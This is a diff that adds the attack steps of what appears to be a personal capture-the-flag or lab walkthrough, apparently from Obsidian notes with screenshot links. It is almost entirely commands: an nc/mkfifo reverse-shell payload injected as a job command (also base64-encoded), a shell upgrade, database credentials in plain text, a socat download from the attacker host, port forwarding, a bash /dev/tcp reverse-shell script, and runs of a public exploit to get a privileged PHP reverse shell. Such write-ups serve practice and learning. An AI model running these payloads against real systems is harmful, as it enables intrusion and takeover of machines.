@@ -147,3 +147,76 @@ import mysql.connector\n\ndb = mysql.connector.connect(\n    host='localhost', \
 
 ![[Pasted image 20230801104848.png]]
 
+```
+{
+    "job_id": 1337,
+    "cmd": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1|nc 10.17.44.152 1337 >/tmp/f"
+}
+```
+
+```
+ewogICAgImpvYl9pZCI6IDEzMzcsCiAgICAiY21kIjogInJtIC90bXAvZjtta2ZpZm8gL3RtcC9mO2NhdCAvdG1wL2YgfCAvYmluL2Jhc2ggLWkgMj4mMXxuYyAxMC4xNy40NC4xNTIgMTMzNyA+L3RtcC9mIgp9
+```
+
+![[Pasted image 20230801110627.png]]
+
+![[Pasted image 20230801110701.png]]
+
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+z
+stty raw -echo && fg
+```
+
+![[Pasted image 20230801110856.png]]
+
+![[Pasted image 20230801111038.png]]
+
+```
+mysql -h localhost -u app -p s4Ucbrme
+```
+
+![[Pasted image 20230801111445.png]]
+
+```
+./socat TCP4-LISTEN:8080,fork TCP4:127.0.0.1:80
+```
+
+```
+wget http://10.17.44.152:81/socat
+```
+
+![[Pasted image 20230801112702.png]]
+![[Pasted image 20230801112721.png]]
+
+https://www.exploit-db.com/exploits/50457
+
+![[Pasted image 20230801113247.png]]
+
+![[Pasted image 20230801113409.png]]
+
+*shell.sh*
+```
+#!/bin/bash
+/bin/bash -i >& /dev/tcp/10.17.44.152/50457 0>&1
+```
+
+![[Pasted image 20230801113728.png]]
+
+```
+python3 50457.py 127.0.0.1 80 / app s4Ucbrme /home/ada/shell.sh
+```
+
+![[Pasted image 20230801120711.png]]
+
+![[Pasted image 20230801121740.png]]
+
+```
+ssh -R 8888:localhost:80 kali@10.17.44.152
+```
+
+```
+python3 50457.py 10.10.3.104 8080 / app s4Ucbrme "sudo /usr/bin/php /home/ada/php-reverse-shell.php
+```
+
+![[Pasted image 20230801123155.png]]
